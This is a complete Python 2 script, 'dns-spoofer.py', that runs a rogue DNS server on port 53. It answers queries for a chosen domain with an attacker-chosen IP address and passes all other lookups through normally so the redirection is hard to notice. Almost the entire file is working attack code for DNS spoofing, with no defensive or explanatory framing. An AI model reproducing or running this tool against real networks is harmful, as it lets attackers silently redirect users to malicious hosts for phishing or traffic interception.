#!/usr/bin/python

import sys
import os
import getopt
import socket
import threading
import thread
import time

if os.geteuid() != 0:
    exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")

def resolve_dn(domain_name):
    try:
        dataip = socket.gethostbyname_ex(domain_name)
        ip = str(dataip[2][0]).strip("[] '")
        print "Resolving Domain [%s]->[%s]" %( domain_name ,  ip  )
        return ip
    except socket.gaierror:
        print "Error! Resolving Domain [%s]!" %( domain_name )
        return "1.1.1.1"

def run_thread (threadname, sleeptime):

    global threadcount, activethreads, threadlock
    print "DnsResolver -> Setting Automated Refreshing -> [%ssec]"%sleeptime
    try:
        while 1:
            time.sleep(sleeptime)
            threadlock.acquire()
            resolve_dn(target)
            threadlock.release()
    except:
        print "%s error.... Ip changed to something unsual" % (threadname)
        activethreads = activethreads - 1
        threadlock.release()

class DNSQuery:
    def __init__(self, data):
        self.data=data
        self.dominio=''
        tipo = (ord(data[2]) >> 3) & 15   # Opcode bits
        if tipo == 0:                     # Standard query
            ini=12
            lon=ord(data[ini])
            while lon != 0:
                self.dominio+=data[ini+1:ini+lon+1]+'.'
                ini+=lon+1
                lon=ord(data[ini])

    def respuesta(self, ip):
        packet=''
        if self.dominio[:-1]==domain:
            packet+=self.data[:2] + "\x81\x80"
            packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'   # Questions and Answers Counts
            packet+=self.data[12:]                                         # Original Domain Name Question
            packet+='\xc0\x0c'                                             # Pointer to domain name
            packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'             # Response type, ttl and resource data length -> 4 bytes
            packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.'))) # 4bytes of IP
            print 'Spoofing: [%s] -> [%s]' % (self.dominio[:-1], ip)

        else:
            self.ip=resolve_dn(self.dominio[:-1])
            packet+=self.data[:2] + "\x81\x80"
            packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'   # Questions and Answers Counts
            packet+=self.data[12:]                                         # Original Domain Name Question
            packet+='\xc0\x0c'                                             # Pointer to domain name
            packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'             # Response type, ttl and resource data length -> 4 bytes
            packet+=str.join('',map(lambda x: chr(int(x)), self.ip.split('.'))) # 4bytes of IP
            print 'Normal Request of: [%s] -> [%s]' % (self.dominio[:-1],self.ip)
        return packet
   

def main(argv):

    global sleeptime, domain, target, ip
    sleeptime=600 #DNS refresh interval in seconds. This is usefull when you are not on static ip plan by your ISP 600 = 10mins
    domain = None
    target = None
    ip = None

    try:
        opts, args = getopt.getopt(argv,"hd:t:",["ifile=","ofile="])
    except getopt.GetoptError:
        print 'dns-spoofer.py -d <domain> -t <target>'
        sys.exit(1)
    for opt, arg in opts:
        if opt == '-h':
            print 'dns-spoofer.py -d <domain> -t <target>'
            sys.exit()
        elif opt in ("-d", "--domain"):
            domain = arg
        elif opt in ("-t", "--target"):
            target = arg

    if not (domain and target):
        print 'dns-spoofer.py -d <domain> -t <target>'
        sys.exit()

    print 'Domain to spoof: ', domain
    print 'Target for domain is: ', target
  
    print "Staring Rogue Dns Server for [%s]" % domain

    ip=resolve_dn(target)
    activethreads = 1
    threadlock = thread.allocate_lock()
    thread.start_new_thread(run_thread, ("DnsResolver", sleeptime))
    udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udps.bind(('',53))
    print "Staring Script...."

    try:
        while 1:
            data, addr = udps.recvfrom(1024)
            p=DNSQuery(data)
            udps.sendto(p.respuesta(ip), addr)
    except  KeyboardInterrupt:
        udps.close()

    print '\n\nUser Requested ctrl+c! \nClosing Connections -> [OK] \n'

if __name__ == "__main__":
    main(sys.argv[1:])